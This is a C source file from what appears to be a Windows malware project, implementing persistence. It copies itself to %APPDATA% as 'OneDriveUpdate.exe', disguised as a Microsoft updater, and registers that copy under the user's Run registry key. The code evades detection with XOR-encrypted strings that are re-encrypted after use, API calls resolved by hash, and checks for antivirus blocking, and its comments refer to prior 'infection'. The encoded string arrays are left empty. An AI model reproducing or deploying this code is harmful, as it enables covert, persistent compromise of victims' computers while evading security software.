#include "config.h"
#include "persistence.h"
#include "evasion.h"
#include <string.h>

// used to cast generic API function pointer (FARPROC)
typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LONG (WINAPI *pRegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LONG (WINAPI *pRegCloseKey)(HKEY hKey);

// --- new typedefs for self-copy logic
typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
typedef BOOL (WINAPI *pCopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);

bool install_persistence(const char* current_exe_path) {
    // load key runtime (in stack)
    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);

    char enc_advapi[] = { /* advapi32.dll\0 */ };
    char enc_kernel32[] = { /* kernel32.dll\0 */ };
    char enc_RunPath[] = { /* Software\Microsoft\Windows\CurrentVersion\Run\0 */ };
    char enc_ValName[] = { /* OneDriveUpdate\0 */ };
    
    // --- new encoded strings for self-copy
    char enc_AppData[] = { /* APPDATA\0 */ }; 
    char enc_DestFile[] = { /* \\OneDriveUpdate.exe\0 */ };

    // API hashes
    // NOTE: calculate these using hasher.py
    DWORD hash_RegOpenKeyExA = 0x074A975C;   // djb2 for "RegOpenKeyExA"
    DWORD hash_RegSetValueExA = 0x345872EA;  // djb2 for "RegSetValueExA"
    DWORD hash_RegCloseKey = 0x736B3702;     // djb2 for "RegCloseKey"
    DWORD hash_GetEnvVarA = 0x87889701;      // djb2 for "GetEnvironmentVariableA"
    DWORD hash_CopyFileA = 0xAC2253C1;       // djb2 for "CopyFileA"

    // --- load DLL dynamically

    // advapi32.dll
    xor_crypt(enc_advapi, sizeof(enc_advapi), cypher_key, cypher_key_len);
    HMODULE hAdvapi = LoadLibraryA(enc_advapi);
    // OPSEC: recypher DLL name immediately
    xor_crypt(enc_advapi, sizeof(enc_advapi), cypher_key, cypher_key_len);

    // kernel32.dll
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
    // OPSEC: recypher DLL name immediately
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);

    if (!hAdvapi || !hKernel32) return false;

    // --- dynamic resolution via hashing

    pRegOpenKeyExA fnRegOpenKeyExA = (pRegOpenKeyExA) get_api_by_hash(hAdvapi, hash_RegOpenKeyExA);
    pRegSetValueExA fnRegSetValueExA = (pRegSetValueExA) get_api_by_hash(hAdvapi, hash_RegSetValueExA);
    pRegCloseKey fnRegCloseKey = (pRegCloseKey) get_api_by_hash(hAdvapi, hash_RegCloseKey);
    pGetEnvironmentVariableA fnGetEnvVarA = (pGetEnvironmentVariableA) get_api_by_hash(hKernel32, hash_GetEnvVarA);
    pCopyFileA fnCopyFileA = (pCopyFileA) get_api_by_hash(hKernel32, hash_CopyFileA);

    // if AV blocks a function -> return
    if (!fnRegOpenKeyExA || !fnRegSetValueExA || !fnRegCloseKey || !fnGetEnvVarA || !fnCopyFileA) return false;

    // --- self-copy logic

    char dest_path[MAX_PATH];
    
    // decrypt APPDATA string
    xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);
    // get APPDATA path (ex. C:\Users\Username\AppData\Roaming)
    DWORD env_res = fnGetEnvVarA(enc_AppData, dest_path, MAX_PATH);
    // OPSEC: recypher
    xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);

    if (env_res > 0 && env_res < MAX_PATH) {
        xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);
        // append fake filename to APPDATA path
        strcat(dest_path, enc_DestFile);
        xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);

        // copy current exe to %APPDATA%\OneDriveUpdate.exe
        // NOTE: FALSE = overwrite file if it already exists from a previous infection
        fnCopyFileA(current_exe_path, dest_path, FALSE);
    } else {
        // fallback: if APPDATA fails, use current path for registry
        strcpy(dest_path, current_exe_path);
    }

    // --- registry modification
    
    HKEY hKey;
    
    xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
    xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
    
    // open key to write registry
    LONG open_res = fnRegOpenKeyExA(HKEY_CURRENT_USER, enc_RunPath, 0, KEY_WRITE, &hKey);
    
    if (open_res == ERROR_SUCCESS) {
        // NOTE: writing dest_path (the copied file) instead of current_exe_path
        fnRegSetValueExA(hKey, enc_ValName, 0, REG_SZ, (const BYTE*)dest_path, strlen(dest_path) + 1);
        
        // close registry handle
        fnRegCloseKey(hKey);
        
        // OPSEC: encode strings in RAM
        xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
        xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
        
        return true;
    }

    // OPSEC: encode also if failure occurs
    xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
    xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
    
    return false;
}